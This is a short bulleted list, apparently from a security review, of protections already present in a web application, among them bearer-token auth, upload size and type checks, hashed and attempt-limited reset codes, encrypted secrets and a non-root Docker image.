- Stateless bearer-token API (no auth cookies), which blunts the CORS weaknesses.
- `ContentDisposition` builder used in document/billing controllers.
- Uploaded workbooks are handled in memory only (fits Render/Railway's ephemeral filesystem); 20 MB and `.xlsx` checks exist.
- Reset codes are stored hashed (`passwordEncoder.matches`), attempt-limited, and masked in logs; app-setting secrets are encrypted at rest with AAD.
- Photo uploads have a MIME allowlist and size limit; Jackson polymorphism uses closed `NAME` subtypes.
- Docker image runs as a non-root user.
